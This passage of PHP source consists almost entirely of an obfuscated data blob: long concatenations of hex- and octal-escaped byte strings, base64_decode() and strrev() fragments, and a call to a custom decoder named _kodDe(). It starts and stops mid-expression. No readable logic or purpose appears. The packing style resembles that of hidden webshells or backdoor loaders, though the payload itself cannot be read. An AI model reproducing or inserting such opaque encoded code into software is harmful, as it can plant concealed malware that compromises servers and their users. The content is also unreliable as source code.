f8\xea\xfb\x2f\xdc\xf9\xe1\x45\x2b\x17\x4d\x78\xa5\x64\x6d\x1f\x77\xdd\x5e"."\xdb\xbb\xaf\x55\xdf\x5d\xd4\xb9\x20\xb5\x65\xd0\xd\xd7\xaf\x1d\xb5\xf3\x40\xdf\xfa\x5b\xaf\x51\xaa\xb7\xf\x5b\x71\xce\xdd\xda\xba\x4d\x53\x3c\xf7\x2e\xf8\xc1\xf5\xd9\xa5\x4f\x15\x8c\x58\xf2\xe4\xac\x7b\xdb\x77"."\15\170\344\316\103\341\265\237\114\230\251\277\371\363\242\355\211\231\172\107\307\310\207\157\330\360\315\227\123\177\232\65\165\374\221\115\175\175\47\345\276\270\375\310\374\333\166\175\173\347\366\113\146"."\257\235\276\353\223\207\47\276\371\345\243\145\23\113\143\277\376\362\121\143\257\157\247\175\166\60\171\153\375\103\33\353\242\165\15\33\67\34\127\236\74\167\141\316\75\363\27\376\62\122\231\334\175".base64_decode('82knLprR/emzPn3tkeqcT79845tgR3LTwasW7fztxIVNU0tveG/xoN637Vn69qcLojvWPzc=')."\357\37\57\332\77\51\332\63\104\53\311\333\167\355\232\31\317\155\111\65\274\173\326\247\217\337\376\327\30\345\310\216\277\236\137\173\264\341\262\176\141\307\270\307\13\6\275\260\340\226\320\33\107"."\37\271\343\366\143\207\132\126\75\162\154\132\347\37\277\174\371\226\167\133\347\241\303\207\177\371\345\366\327\167\26\356\270\362\77\173\277\337\276\352\300\277\377\336\367\345\173\337\135\367\331\261\277".strrev('8<g\'W^_~-[Ϫt{7U|=fk;ޓ1')."\xd\x69\xcc\x89\xde\x45\xef\x2c\x5d\x79\xf9\x69\x23\x76\x87\xc7\xdc\x3f\x7f\xfe\x45\xea\x93\xbe\x9b\x2a\xaf\xb8\xa3\x4f\xe0\xd1\x3f\x9e\x9d\x3a\xbf\xb7\x65\x6b\xe9\xb6\x9f\x5a\xbf\xf8\xf5\x92\x87\x9e\x7e\xf8\xa2"."\xe9\x5b\x1f\x3d\xdc\x3a\xeb\xb\xcf\xcc\x96\x87\x1a\xf3\x37\x7a\x66\xf\x9e\x72\xdd\xd1\x37\xe\x8f\x7e\x7f\x6b\xc1\xd9\x27\x36\x6f\xdb\xd1\x18\xbd\xf4\xc7\x7\x7d\xab\xcf\x5b\x9f\x78\xbc\xbd\x4e\x9d\xf3\xca\x6".base64_decode('zxJjy21XLrzx6w8uPeOd0O7rl2/NWXnTzujU15bN7j+8uOqN/ZOPWzP8lksTW5ZW2j2jj24=')."\270\377\332\303\155\347\235\60\370\253\365\227\51\67\345\152\57\315\237\65\356\331\312\311\271\307\235\323\363\124\343\152\373\303\373\133\366\77\376\325\107\27\176\372\311\323\163\267\344\375\252\134\35".strrev('Z}oՍxy6^n-r{+	x孳')."\366\110\374\202\271\257\131\332\106\327\16\274\251\150\136\353\325\325\371\357\372\257\355\373\221\126\371\234\353\252\235\167\377\176\375\211\365\266\203\356\374\325\337\26\14\35\172\353\342\27\332\76\272"."\x7e\xfd\xc5\x3\x8d\x9f\x2f\xdc\xf4\xf5\xba\x3\xa7\x9d\xfb\xc8\xde\x3b\x1e\x8e\xe\xfd\xe8\x86\x2d\xcd\x47\x4e\xf8\x71\xd5\x49\x3\x66\xd5\x1e\xfc\x65\xf2\x92\x6b\x2e\x2b\xfc\x7e\xc9\x53\x39\xed\x6f\x17\x9c\xb1".base64_decode('Zvbjvgvrb6j/9sbnO5brR767a9yICZdaljvPrn18fK/PGmdv3uYe+tsez9LnH/BWre8779s=')."\357\153\216\16\137\172\126\217\207\176\270\345\204\213\37\270\73\176\147\374\147\351\221\73\172\34\11\14\172\347\271\306\43\101\377\133\251\43\226\35\357\67\135\334\147\200\165\344\5\366\310\134\117"."\xa8\x5b\xe5\xd6\xad\xcf\x16\x2d\xd8\xe9\x1a\xf5\xc3\xcd\xab\xfe\x7d\xec\xcb\xef\xef\x2e\x7c\xeb\xef\xdf\x6e\x5b\x7f\xc3\xbf\xe5\x19\x7f\x7d\xff\xd7\x59\xc7\xce\xfb\xe1\xe7\xef\x3f\x3c\x50\x7c\xde\x95\xa3\x66\x4e"."\75\364\310\43\137\176\66\156\366\306\216\377\174\373\345\215\147\275\65\353\77\233\326\37\350\335\70\343\350\206\327\147\317\376\343\310\354\262\33\77\177\240\350\234\127\347\277\265\266\343\216\345\163".base64_decode('t65eOHDvKzsWnvL2S4MTFWN/XdWvm2Xh0Zss19cbM1e+8Wf5mv7rlu7818Vrvvzu8J6X9tw=')."\xf6\xda\xa4\x19\x1f\xf\x9e\xfe\xe6\x6d\xbf\x1d\xb9\x63\xea\xa2\x8a\xa6\xe5\xfe\xed\x6d\xda\xfa\xe0\x9a\x58\xe9\x9e\x75\x3f\xec\xfa\xe7\xa6\xe9\x7f\xbe\x79\x4d\xfd\x26\xa3\x23\x39\xe3\xf0\xa7\x7f\xde\x39\x65\xc4"."\333\77\164\76\120\366\354\250\273\236\253\335\323\262\372\235\216\201\63\67\377\165\160\314\326\107\247\265\107\267\74\375\364\41\207\126\331\337\275\157\354\275\3\76\276\367\252\177\137\365\340\276\373"."\375\17\267\16\333\137\275\146\336\370\365\175\254\13\377\214\333\176\272\72\120\66\152\366\107\71\237\57\53\356\331\377\247\226\277\57\130\272\247\367\372\235\75\147\153\317\55\74\271\156\332\312\223"."\x7f\xda\x35\x77\x5e\xb0\x62\x72\xc5\xcd\xef\x55\xb9\xa6\xd6\x2c\x18\x78\xfb\xa2\x87\xae\xde\xac\xbd\xb1\x27\xb4\xb4\x75\xc8\x45\xcf\xcf\xad\x3c\x77\x77\xf7\xe2\xfa\x83\xbd\xfa\x7a\xfe\x72\x59\xb7\x7c\xd7\xeb\xd8"."\202\274\331\115\215\337\16\170\365\246\313\143\37\217\226\327\334\170\314\77\243\327\344\153\317\376\150\231\245\375\244\153\327\264\14\330\172\150\302\36\307\344\147\306\316\31\174\353\165\233\376\76\166"."\xdc\x35\xd\xe5\x79\x2b\xce\xa1\xa2\x15\xf7\xa9\x6e\xba\xc3\x2f\x98\xac\xc2\xfb\x35\xcc\x2e\x5c\xf4\x4b\x87\x24\x15\xec\x11\x96\xd6\x40\x25\x1e\xa2\x1d\xa\xea\x70\xd8\xd9\xc6\x1d\xbe\xb\x7e\x14\xd4\x30\x7f\xc7"."\211\357\117\46\250\204\5\103\134\206\111\62\353\51\16\203\362\14\337\235\204\37\161\10\325\213\116\250\100\43\114\176\347\101\274\202\265\130\306\335\341\22\46\127\160\5\205\26\237\360\325\362\75".strrev('SFCwk%YND2&&7|%aBt{vNɾ7=')."\203\306\345\101\44\36\12\336\227\250\254\252\104\42\146\211\34\176\336\226\100\373\336\344\107\334\67\63\201\120\126\274\351\1\345\370\132\323\233\100\50\21\201\333\303\31\331\221\157\73\177\252\211"."\65\233\324\56\370\274\63\347\326\63\366\255\223\272\36\151\122\22\266\224\346\26\222\121\51\342\262\6\376\126\253\112\130\360\355\205\222\361\235\41\173\33\30\214\104\366\122\165\246\51\300\333\70"."\xa0\x11\x36\x25\x84\x2c\x5\x9d\xc\xd7\x51\x41\xb8\xf4\x6c\x7c\xfd\xf1\xec\xc9\x56\x2d\x11\xe6\xcf\x1e\xf0\xcc\xa9\x58\xb6\xec\xd0\x16\x94\x81\x59\x3f\xf1\x10\x8\xae\xfb\xf8\xf6\xbc\xda\x2e\x6a\x11\x69\x25\xa0".base64_decode('OuMTXbfR+eMgVqJZabOxZ734yQDSrLJkZfdQGBS6CsvIytsh3j4z9Vd0x2cqlcBeW8WCLAc=')."\x49\x13\xac\x3d\xb3\x17\xf6\xa9\x70\xeb\xad\x8b\xd2\xd9\x13\xe9\x60\x37\x67\xb6\xb\x8e\x76\x26\x14\x92\x3d\x1d\xe2\x79\x44\xf5\x2b\x6d\x19\x5d\x84\xc9\x59\x4a\x61\xc\x44\xa5\xc4\xb\xb8\x69\xe9\x5d\xe\x8e\xc9".base64_decode('L6cwnnp7LNvHmN/VzCk2uoDzMpyupxXKksBLZWIILmR+Rw42HL0EwVuAgVEVWuPjNLs5Cec=')."\347\37\317\54\340\114\113\303\45\62\277\114\312\244\175\32\55\363\160\230\23\165\123\346\364\357\322\71\356\42\73\250\110\170\364\42\343\3\1\75\113\31\334\320\254\305\160\22\54\131\311\30\253"."\251\254\150\36\312\213\1\150\312\350\242\205\231\303\222\320\43\152\27\203\342\323\43\231\131\273\32\222\254\231\63\77\107\10\101\172\156\164\52\231\275\25\166\376\144\4\317\332\125\53\262\146\356"."\262\25\74\67\275\77\100\16\271\331\231\242\326\102\331\23\235\35\312\203\341\352\343\233\67\134\144\112\261\23\35\323\353\145\252\370\0\232\14\275\62\13\317\331\310\361\204\16\157\302\2\316\226"."\1\320\142\14\272\157\336\265\7\266\54\163\325\112\64\140\6\233\350\176\52\66\45\106\357\111\200\101\114\260\173\266\61\55\64\105\220\314\100\273\3\374\114\122\203\313\217\347\215\123\103\0\362".base64_decode('1A8bFjXJlilJEux3CQT0QdGocIXDQiYwOqaHDnCcOTrm9wD4MxM+6Pitq49mfIC1XTYfrwg=')."\xa7\x53\xa2\xac\x27\x80\xf9\xd2\x81\x33\x2b\xd8\x31\xa5\xbb\xa8\x65\xb8\x90\x36\x3c\x58\xc2\x33\xc9\xac\xe8\xba\x48\xb3\xce\xc5\x2e\xb4\x67\x28\x78\x6c\x43\xf4\x12\xc\xaa\x5\x5\x20\x4d\xb3\x88\x68\x4b\xca\xb"."\171\63\262\40\167\41\60\45\55\243\160\105\61\55\245\232\371\22\41\31\55\174\126\54\164\102\54\160\11\221\237\12\341\335\143\124\104\246\222\75\114\65\371\222\340\237\302\73\243\166\323\303\57"."\xfc\x9a\x86\x66\x70\xdf\xd4\xc4\xd6\x81\x92\x49\xf1\xb1\x38\x7a\x8a\x36\x45\x47\xd3\x83\x89\x3c\xff\x6\x8e\xb2\x23\x30\x13\x2a\xa5\xbf\xb0\x20\xb\x8f\x11\xd1\x7e\xb3\xe1\xb0\x60\x49\xdf\x42\x37\x7a\x2d\xb8\x7d".base64_decode('FtY0QSC3pONDV5dGZPgeDywuHPKluEs5Gc89gDArBzzDUEkR2GFYHE9BLUPKjGAlggrDVnM=')."\327\363\270\355\54\116\346\307\344\50\235\26\362\11\50\105\312\211\240\130\52\312\55\107\100\244\302\344\372\15\372\3\241\335\322\305\333\265\31\303\210\14\41\54\364\131\121\13\56\150\61\225\61"."\x5a\x75\xc1\x88\xd1\x84\xcb\x66\xe4\x4b\xa7\x25\x18\x63\x79\x58\x44\x5b\x78\x47\x87\xd\x33\x8c\x54\x9\xd7\x35\x21\x6a\x8d\xd1\x9b\x4\x55\x40\xdc\x7c\x67\xd7\x62\xe2\x9\x95\xc8\xbe\x31\xe6\x2b\x91\x18\x43\xb5"."\x2b\xf1\xb4\xa7\x3c\xe\xe2\x9f\xbf\x4c\x31\xb4\x23\x7f\x22\xe\xf3\xfd\xf8\x94\xef\x63\xcf\xf6\xa2\xd3\x67\x76\x3b\x74\xc9\x8c\xd1\xb3\x9a\x9a\xdc\xee\x8b\x4e\xd7\xf6\x3d\xf3\xf8\x45\x1b\x4e\xbb\x27\xb5\x72\xec".base64_decode('FbVld7RNvfX8hRuMi19+edRT/fWCkQdf3nRo1oxH/7nfeuvchuUPntnb3+/wa9LwNzbXTzs=')."\272\341\245\372\377\174\56\367\173\147\316\273\347\310\53\123\341\347\167\214\230\366\356\311\301\63\356\131\374\371\312\176\211\375\375\307\317\377\341\231\366\105\33\173\151\157\73\213\356\174\314\377\304"."\xc9\xa5\x3\xbe\xf7\xf5\x7d\xe0\x99\xa5\xcb\x9b\x3e\x79\xff\xb7\x9e\x67\x1c\x58\xbe\xec\xe3\xbb\x4e\x7d\xef\xcb\xbb\x2b\x1a\xa6\x7e\xf6\xc0\x63\x4d\x77\x2d\x9a\xf1\xf2\xd9\x8b\xe7\xd4\x96\x14\x6c\x2b\x3a\xfd\xce".base64_decode('0nFjJ3/X76G6az8+6cW+F993R87A3e8+2uued6xlFR8tWnDaF/YXIg8suHLRnqMbv2lvvXk=')."\325\264\303\235\37\374\266\373\325\315\353\57\77\377\212\262\376\227\156\272\165\340\353\137\277\271\341\226\363\276\272\352\267\57\232\237\36\271\116\357\77\340\215\167\166\336\263\174\312\65\365\223\206"."\x3d\x74\xc3\x57\x37\x2e\xef\x7f\xff\x1\xc7\xb2\xf7\x3f\xe8\xbf\x29\xd2\xb9\x7e\xf9\xfc\x6b\xc2\xbb\xf6\xed\x7f\x63\x7f\xdb\xfa\xe5\x2b\xa\xa7\x5c\xdb\xf9\x51\xe9\xf0\xdf\x5b\x66\xaa\xa1\x57\x7e\x3b\x7a\xd5\x33"."\xf\xe8\xb3\x8f\xbb\xe0\x12\xa5\x5f\x4e\x77\xba\x39\x22\xf0\x7e\x80\x9e\xcc\xb1\x8f\xd2\x44\xc5\x54\x14\xb4\xb6\x24\x54\x35\x66\x15\xdd\x69\x88\xf\x58\x28\x5d\xc9\x1d\xba\x58\x9f\xb5\x9\xcc\xb4\x35\xcc\xfc\x77"."\xa6\xe5\xc5\xe2\xbe\x9a\x59\x42\xfc\xaa\x50\x6\x3a\x4d\x34\xb\x6e\x8\x1c\xc7\xee\x14\xcd\xf5\x74\xaa\xf0\x2a\x64\xf6\x6f\xa7\xb2\x7c\x97\xe4\x8f\x70\x63\x23\xa1\x80\x16\x6b\xd3\xc\x4d\x38\x72\x23\x3\xd4\x69"."\xca\x9f\x82\x6\x5f\xaa\xf0\x4c\x77\xab\xc9\x7e\x17\x5b\x37\x70\x52\x9f\x31\xe2\xa8\xeb\x42\x85\x61\xd1\x2d\x28\x59\x42\xf4\x72\x1d\x36\x12\xa3\xb6\x7d\xc8\x76\x8f\xf8\x8f\x21\xb6\xf8\xe4\xb2\x4\x7d\x9f\x65\x42"."\xb4\x30\xcc\xdf\x26\x41\x47\x77\x24\x63\x61\xba\xa1\x6\xf7\x64\x2\x6d\xe4\x4\xa1\x41\x34\x5\x49\xf7\xa9\x6a\x72\xdb\x4d\x5e\x62\x70\xb0\x3\x42\x13\x98\xb3\x37\x7c\xde\xc9\x19\x6d\xda\xf7\x9a\x85\xc7\x1d\xc4"."\60\313\346\150\345\156\176\320\263\62\316\150\234\172\173\40\15\62\355\13\221\142\122\251\124\204\314\175\70\213\32\311\174\344\41\207\54\230\213\124\153\6\177\120\33\223\71\217\311\110\56\113\266"."\54\40\164\53\222\333\372\250\41\75\246\107\73\63\0\265\52\50\110\273\356\246\155\345\156\21\14\121\375\317\160\0\112\24\171\376\172\127\104\243\243\154\351\57\62\2\177\134\11\231\34\41\40"."\6\151\172\27\46\41\356\6\140\177\346\260\265\76\156\54\215\257\304\326\244\161\370\14\336\233\324\115\365\342\71\24\314\257\261\34\1\235\102\1\240\10\202\50\341\27\254\140\371\43\131\16\301"."\x3f\x9\xf7\xca\x2f\x53\x87\xec\x50\xca\x12\xb6\x42\xd2\x1a\x6f\x36\xc7\xd4\x74\xb2\x3d\x2a\x47\xb9\x83\x2b\xb4\xd5\xca\xea\x85\x56\x4a\x6c\x6\x22\x26\xa1\x81\xed\x5b\x9a\x5a\x44\x3e\x0\xca\x8\x77\x6d\x61\x3b"."\xc5\xed\x5b\xf1\x89\xaf\x6c\xa5\x45\x83\x80\x88\x19\x97\xe2\x54\x27\x82\x3a\x12\xbc\x82\xce\x85\x26\x3c\xfa\xe8\x12\xb5\xd\x8b\x61\x66\xd7\x21\xa0\x11\x76\xb8\xe9\xcd\x7d\x70\x99\x3e\xc8\xba\xc9\xa0\xb0\x7\x3e".strrev('RuVWpT*10v-ǓK\\Ÿb (ZqC8"5')."\210\307\105\232\45\274\146\304\44\132\144\374\220\115\320\347\15\264\320\136\131\150\27\54\364\351\34\213\60\32\26\214\356\26\116\116\115\343\55\72\15\21\21\242\312\154\342\55\132\116\40\22\47"."\210\262\262\40\213\242\154\10\231\304\235\100\210\315\234\44\240\374\225\334\36\27\61\54\323\276\41\301\44\263\115\265\253\2\213\270\302\364\142\224\206\275\11\10\122\274\370\376\7\10\232\50\77"."\x60\xa5\x1a\xbc\xc3\xc8\xe4\x3\x33\x73\xcb\x4c\x17\x2d\x2\x85\x4c\x38\x68\xe3\xca\x4\x9b\xb9\xff\x85\x76\x86\xee\xdd\xb5\xa4\x6f\x2a\x21\x4e\x8f\x8b\x8a\x96\x89\x82\xc8\x2\xa1\x76\xa4\x9b\x64\xec\x48\xa5\x67"."\x80\x88\xc2\x1d\x1f\xf9\xd3\x8e\x61\x58\xa3\x45\x7c\xc9\xd2\x81\xff\xff\x5d\x44\x2f\x5b\xa5\xeb\x96\x44\x5e\x87\x36\xd7\xa2\x32\xc0\x5\x7a\x10\x13\x1c\x1\xfc\x2f\x12\xf9\x42\x35\x29\x9b\xe9\x8f\xdc\x92\x5\xc6"."\147\101\110\303\301\64\361\50\123\34\44\7\23\46\311\112\224\73\161\330\224\214\237\372\201\117\216\361\17\127\250\306\224\244\316\367\123\63\116\122\302\70\3\25\246\62\43\246\107\315\120\230\177"."\xc1\x52\x64\xc9\x4e\xa8\xd8\x1b\x55\x26\x8f\xdf\x32\x7f\x9b\x8a\x3f\xd\x2a\x0\xc5\xba\x4\xf6\x8a\x34\x67\x9d\x79\x31\x14\x4e\x45\x40\x82\x89\x6d\xc0\x97\x5c\xd3\x48\x22\x6e\xbe\x89\x3f\x63\x83\x30\x13\x88\xa1".strrev(')6\\kfE	wMcڒ:nXٸl˸P'."\r".''."\n".'|A(')."\144\77\221\34\323\255\57\304\26\271\77\27\54\64\120\131\101\164\360\212\144\156\210\364\326\114\226\233\46\152\20\313\173\46\257\13\133\46\204\171\144\345\31\224\315\11\315\204\41\221\223\13\142".strrev('bh;P(<7	=p0K2@2!ЛVSHJ!!').base64_decode('eIh5esFPd5HDVNA+PSFWwk7muUxKCiBIen4llEyJ4jZyEo2D1mIpTDkOfcVbEg+v8SSllRU=')."\37\246\101\137\14\44\124\363\161\45\126\240\220\230\57\220\175\61\15\235\344\12\151\111\130\205\213\271\54\234\302\55\34\121\116\341\13\254\301\310\375\120\205\142\76\70\304\265\33\110\244\67\324".base64_decode('LI1CSfZQkqcC3Kki9zIT4hUHdAEBXjCQ6zyu8QFXjTNP2MyTcvtPsPaPWvuHc9F1BCj+W8w=').base64_decode('lwrgfw5vnSeQlza2qACYxszs+FY3mky4nZmZgV/shhfbsx+Z52YWY/cb/s/6k1GeXR6H3QQ=')."\255\167\220\331\147\55\315\100\255\166\166\221\60\72\205\273\375\245\217\323\222\354\224\312\306\50\251\203\25\220\171\357\144\142\230\265\170\240\165\20\173\376\2\135\164\241\234\47\373\233\361\224\263"."\xa\x57\xdd\x21\xcd\xa8\xa1\x2e\x86\x30\x7d\xe1\x9b\x99\xe9\x97\x1c\x48\xb7\xc8\xe1\x8e\x88\xf9\x45\x45\x25\xe8\x7f\x13\x8e\xe0\x39\xa6\xf4\xc\xfb\x45\x84\xa8\x8f\x2f\xac\x50\xf2\x86\xe0\x98\x26\xe2\x69\x66\xa4"."\237\254\0\356\30\350\377\122\275\24\131\230\214\4\120\246\370\377\371\27\6\162\372\353\340\46\70\174\1\266\151\161\141\107\3\333\304\60\73\17\35\371\363\147\345\20\122\263\30\141\103\42\271".base64_decode('dYj1CA6zIQKYeUGluTACiRWgImmZMEzMxQ/4TDZSJufv9MxBpKMkgzRSYjTHlfYOK2VY6Eg=')."\xc1\x8f\x4e\x6a\x51\x10\x8b\x15\x16\xd3\x46\x74\x96\xe2\x4a\xba\xbd\xa\x7f\x4f\x5\xdd\x49\x63\x1e\x66\xb3\x94\xc5\x3e\x0\xd1\xed\x48\xe6\x82\xd3\x9f\x91\x54\x6b\xf7\xfb\xc7\x1\x42\x80\x5d\x6\x66\x24\x63\xc7"."\235\334\17\141\106\122\155\265\327\323\125\232\263\306\356\162\363\306\13\302\120\274\125\27\225\24\152\104\44\154\53\102\163\177\67\67\14\242\147\4\176\205\271\171\324\271\244\46\206\5\267\204\302".base64_decode('V8wHnuKwGtQ7HAvETSZNJhpjuuImHrwLtwR4t6CgzCRvj/OKLFMlPP+OjvipPQ0aL114dZg=')."\326\147\72\231\101\367\62\111\267\233\263\111\173\102\145\330\42\302\244\266\10\160\164\347\1\331\232\11\310\126\140\222\253\202\344\227\357\270\1\132\12\37\56\202\166\11\174\267\105\174\40\12\136"."\161\143\7\46\104\311\55\357\24\310\73\201\325\31\342\373\355\151\307\172\231\336\326\262\270\152\313\342\204\315\154\134\47\40\237\160\312\53\64\45\153\172\115\66\240\77\115\13\112\323\133\115\173"."\x21\x99\xea\x20\x82\x70\x54\x9c\x2c\x9e\x34\x91\xa3\x27\x21\x23\xa2\x1d\x28\x24\x4e\x3c\xab\xc3\xce\xbc\x46\xe2\x3c\x22\xc2\x11\xff\x9\x48\xc0\x17\x76\x50\x51\x46\x61\x34\x58\x41\x13\x66\x31\x74\x10\x4c\xf\xd9".strrev('m>fc ST]Q#;!n	$ǢH'."\0".'\\$zwI')."\32\153\266\151\243\357\107\271\135\345\30\120\110\136\350\162\153\364\31\265\132\207\173\242\253\26\275\122\356\365\331\175\23\344\12\227\217\245\4\354\276\56\122\140\31\277\263\326\356\263\7\50\271"._kodDe('MB8L4migVtDaUy6Jb6QZxHbLsvGvIFby7zrKgJZhhwSID6XwrfgKhWY3PV/GoP08EtDCEktY')."\161\272\252\231\223\250\170\212\276\51\107\51\50\154\105\313\64\22\246\1\372\73\214\374\166\220\337\246\151\3\351\174\21\177\365\41\205\124\250\31\24\227\247\161\347\42\55\323\264\130\163\204\351"."\3\15\150\313\252\121\162\50\261\334\244\344\5\331\106\110\65\320\131\101\254\105\232\6\206\102\142\336\202\330\371\261\371\35\117\350\1\102\312\1\235\16\105\364\124\70\207\215\1\212\166\375\15"."\x5e\xd\x1\xa7\x28\x17\x40\x84\xdf\xd5\xcc\xb7\x78\x6b\x43\x91\x80\x22\x90\x33\x28\xd6\x83\x1e\x10\x61\x9a\xa2\x25\xfe\xa1\x4f\x10\xe0\x18\x39\x56\x32\xbd\xf3\x9\x6a\x9b\x48\xed\x92\xd0\xe3\x71\x32\x79\xf1\x92".base64_decode('X4O32YJkAOGrruxAHClxYdn8CfxiIFsduMZ4QvTpjduPnO+IT5uYwAyEhkp0paqKGbJVj/A=').base64_decode('m9M/KIhJSMiEl8z9YtfH6mGCliWs2SMktLbxI3Yjsj8Hh79KLlmzs3kElcgZKhV8xbfwcIY=')."\14\110\11\66\236\65\45\164\65\150\342\351\7\206\0\152\314\207\260\177\121\161\21\301\61\46\136\10\57\170\204\132\311\202\42\317\166\211\66\375\16\257\247\322\125\5\345\52\142\374\64\262\14"."\x2c\x52\xd8\xef\xe4\x88\x32\x72\xc7\xdb\xfc\xa8\x8b\x83\x50\x7f\x7e\x50\xcb\xb5\x6f\x80\x40\xdc\x46\x9c\x7\x31\xfe\x88\xc7\xdf\xd\x8d\xb4\x69\x51\x3d\x2c\x38\xe6\x40\xcf\xd3\xc2\xa7\x55\x84\x7\x7\xf1\xb2\x91"."\34\240\315\45\305\240\247\215\22\336\350\3\13\4\52\230\212\4\363\223\141\34\331\224\240\136\121\322\212\25\147\24\313\50\201\236\210\154\67\77\12\51\44\263\55\116\230\317\243\13\236\340\323"."\x3e\x35\xa8\x51\x12\x9c\xaa\x66\x7e\x7\x75\xb2\x5d\x4b\x40\x7\x42\x5d\xf5\x72\xa0\xd8\x5c\x78\x8c\x96\x59\xd\x74\xab\xe0\x72\x38\xfd\xf2\x18\x3f\xf4\x6b\xe7\x6\xe1\x6c\x9\x2e\x90\x16\xf0\x75\x91\x62\xf7\x75".base64_decode('leItH9NFioM+e2tOcXu9fuxEL2vz6mprfU6/H6sDRF1Az0bxYDF5tgoQIP5QAfTNzp5GTiY=').base64_decode('mD9bJUIJpafOTZSBICH4QYJ3QVIsSGTYIHtyk+Kug4iiqWTz8IHgD21CMNW/aDB99UyLDWw=')."\xa5\x84\x4d\xf4\x1\x5\xb8\xba\x4e\x6a\x46\x6f\x82\xa\x76\x39\x9a\x21\x1c\x81\x88\xf7\x66\xa8\x7b\x10\xb2\x5a\x85\xc7\x3\xfd\x6a\xa2\x4d\xb\xa9\x6\x1e\x2f\xa1\xb8\x14\x52\xb0\x4b\x8d\x26\x15\x3f\xb9\xa5\x86"."\241\7\102\230\115\62\271\132\112\162\277\167\175\241\227\323\302\302\74\333\200\374\176\175\243\42\54\130\0\201\301\202\302\276\165\244\177\175\71\14\144\350\307\340\200\310\247\102\146\157\116\205\127".strrev('?!k,`RgE'."\r".'S-zEH%A')."\x7e\x20\xd8\x60\x2b\x8\x36\xb2\xba\x1\x60\x3a\x0\xcc\x64\x0\x23\x19\x16\xfc\x9e\xb4\xb7\x32\xef\xfe\xf0\x5\x2e\x56\xc6\x28\xc8\x6b\xc8\xc9\x6d\xb4\x15\x34\x5c\x19\xc\x36\xc2\x60\x3e\x80\x95\x40\x78\xd0\x6f".strrev('\'Z2C	Pd3R:b\\*k^Mknjs(eVv?1Ӭ++').base64_decode('hPlOj2NnSYLaJXqd1dl5Adw2I42tcnvL7W6wIqvkai99OhgRNr75Vlo6ChkRs0eQdX2KFUw=')."\165\13\363\103\217\34\240\53\320\267\213\340\222\20\55\137\113\100\327\245\250\22\353\224\110\1\211\75\302\124\112\237\220\267\321\147\133\155\241\346\226\64\20\303\47\370\224\214\370\210\70\221\120"."\204\307\67\41\255\244\126\200\225\134\172\23\301\16\366\26\126\106\375\52\327\233\265\230\46\163\373\13\250\270\1\315\216\356\310\324\350\323\264\110\104\51\34\142\53\222\362\306\1\111\100\157\67"."\x24\x4f\x40\x1a\x6a\x1b\x38\x42\x1a\xe7\x1d\x37\x74\x70\xbe\x4\x27\x40\x1d\xa7\x36\x8d\xd5\x92\x85\x43\x6\xd\xb3\xd\x1a\x2a\xe5\x8d\xad\xe\xd4\xb8\x2d\x12\xd4\x5c\xa5\x2a\xc0\x10\xf5\x7c\xc9\xd1\xa\xb4\x56".base64_decode('tXDgMOiZcfCQQbbLB0t+pVlJaKQUWVyEVLWTX9g1WWi/yX8bIzNA9IrTjWh0mg01dcHdOZI=')."\x5b\x90\xab\x1b\x35\xcd\xb3\x4c\x15\x7b\x7a\x0\x8\x6\x54\x44\x10\x5\x90\x6\xd8\x82\x46\x3e\x2d\xa8\x41\x42\x2d\x8a\xf0\x5\xac\xbb\x89\xdf\xb0\x72\x94\x81\x85\x23\xcc\xea\xd6\xfc\xd\xf8\x76\x10\xe5\xfc\xe8"."\xc9\x60\x28\xf7\x8a\x2\x50\xef\xeb\x4\x16\x9\x56\xa\xa4\x3e\x94\x54\xca\xc2\x23\x4e\x90\xe5\xb7\x4c\xe3\x67\x2e\x20\x15\xfb\xeb\x67\xac\x2\x21\xc\x98\xa\xf1\x25\x22\xa2\x73\xd5\x90\x5e\xc6\x38\x1f\x68\x83"."\14\207\54\355\172\70\200\44\334\6\157\272\45\332\324\160\161\72\140\40\315\255\67\67\67\151\354\25\126\323\127\355\370\71\363\152\1\303\211\253\347\266\166\370\226\27\255\23\277\16\112\143\200".strrev('I<P\\r F.7ش%M+,N[PlTĢ').base64_decode('wCdOwmJci8Jlq7BGQv0gqhhTaB5kC2mCwHNpE0CJxFsVBGHcDFJXldL3bgwMBhZPNt5TpTY=')."\300\350\51\163\204\230\360\172\250\310\265\204\44\1\20\126\101\36\235\220\124\107\123\241\243\245\320\221\50\164\164\210\145\62\137\106\47\216\205\210\267\13\7\321\71\35\102\41\100\144\342\132\7"."\335\25\21\276\15\205\27\124\243\220\202\172\15\335\12\207\315\255\205\22\37\112\43\235\47\275\47\327\57\264\30\72\315\102\257\13\343\204\50\165\6\212\356\66\60\147\206\246\227\14\103\134\144"."\37\201\304\110\362\274\146\223\100\363\215\50\42\370\164\221\61\266\217\177\1\23\116\261\205\56\230\263\0\215\241\244\260\120\117\45\343\364\36\31\126\222\52\115\52\42\71\273\27\127\3\245\202"."\6\73\257\103\216\372\370\272\16\45\102\203\6\66\231\312\127\352\172\222\267\260\135\63\225\344\317\230\241\250\370\364\4\251\71\306\355\142\303\216\160\202\233\7\340\370\320\301\116\112\154\51\0".strrev('Eakѕad:zcz8sP&}!C Y=')."\11\245\45\112\367\275\221\163\151\122\0\362\3\53\171\46\133\114\266\110\321\224\221\264\2\115\325\364\204\13\173\67\21\172\264\157\126\23\126\47\171\327\225\242\107\114\341\166\20\261\60\164\254"."\130\55\276\324\10\160\201\127\26\245\255\213\262\223\127\370\236\60\365\110\247\305\122\111\346\171\25\32\156\322\241\340\244\130\343\27\154\121\320\77\136\214\114\310\272\332\133\264\346\377\25\174\162"."\134\315\244\15\377\65\41\236\205\230\374\67\170\107\123\64\53\274\275\51\32\317\232\300\340\10\44\334\62\206\33\113\256\264\61\251\20\151\327\377\100\142\360\336\101\0\244\70\262\246\210\0\230"."\x1\xa1\x41\x5c\xb8\xbc\x84\x92\xc0\x3a\x89\xa8\x61\x1f\xd0\x56\x80\x6c\x16\x31\x17\x8a\x77\xa6\x45\x6b\xe0\x66\x29\x86\xb9\xfe\x87\x26\x80\xdc\x3e\x40\xed\xe0\x91\x45\x38\xa3\x44\x66\x46\xc0\xbd\xc2\x2\xd4\xa7"."\47\315\331\62\0\146\14\110\233\336\132\117\25\141\333\374\226\20\204\67\107\350\342\163\325\124\311\225\156\127\55\220\243\175\256\211\136\117\300\356\116\113\250\167\372\2\56\107\6\230\77\134\210".base64_decode('6bnIVgxxvKDVXuakhcyDmkjvVha8SUbjwr4ROsXju2F450e8HowhIv3WYox8Y5+sbNcaeow=').base64_decode('x75P2Q371hQdMRQkq9gWZxIaAvMq0CujosSID7n4ZRl4FxVfKxA9V6FMzKQTUneYGFBpp40=')."\126\275\175\214\221\341\247\26\326\146\362\255\150\152\113\202\74\175\213\64\42\152\200\211\362\140\201\267\1